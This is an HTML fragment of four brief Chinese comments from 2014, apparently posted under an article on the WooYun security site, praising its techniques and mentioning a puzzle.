alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">0x_Jin</span> <span class="reply-time">2014-09-22 14:45:07</span></div><p></p><p>/fd 应该把 puzzle 发 wooyun 的</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">/fd</span> <span class="reply-time">2014-09-22 14:27:59</span></div><p></p><p>作者路過</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Defa</span> <span class="reply-time">2014-09-22 12:48:57</span></div><p></p><p>嗯，有些技巧值得学习</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">gone</span> <span class="reply-time">2014-09-22 12:47:26</span></div><p></p><p>很给力啊!!</p><p></p></div></div></div></div></div></main>
